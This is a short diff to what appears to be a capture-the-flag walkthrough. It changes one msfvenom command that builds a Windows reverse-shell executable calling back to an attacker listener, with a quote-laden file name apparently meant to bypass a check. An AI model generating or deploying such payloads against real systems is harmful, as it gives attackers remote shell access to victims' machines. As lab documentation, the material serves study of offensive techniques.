@@ -228,7 +228,7 @@ to bypass the check
 SO 
 1. Create the payload
 ```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.29 LPORT=2121 -f exe -o "Po77'.exe"
+msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=7002 -f exe -o "Po77'.exe"
 ```
 ### Exploitation
 
